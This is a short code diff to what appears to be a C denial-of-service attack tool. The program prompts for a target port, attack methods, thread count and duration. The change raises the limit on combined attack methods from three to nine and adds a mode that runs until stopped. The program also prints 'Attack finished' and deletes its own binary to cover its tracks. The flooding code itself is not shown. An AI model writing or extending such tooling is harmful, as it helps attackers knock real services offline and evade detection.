@@ -409,7 +409,7 @@ int main(int argc, char *argv[])
     printf("Port (if N/A, put 0): ");
     scanf("%d", &port);
     getchar();
-    printf("Methods (0-8) comma-separated (max 3): ");
+    printf("Methods (0-8) comma-separated (max 9): ");
     fgets(method_input, sizeof(method_input), stdin);
     printf("Threads: ");
     scanf("%d", &threads);
@@ -450,6 +450,14 @@ int main(int argc, char *argv[])
         sleep(duration);
         running = 0;
     }
+    else
+    {
+        while (running)
+        {
+            sleep(1);
+        }
+    }
+
 
     printf("\n\033[1;31m[✓] Attack finished. Shutting down...\033[0m\n");
     unlink(argv[0]); // Self-delete
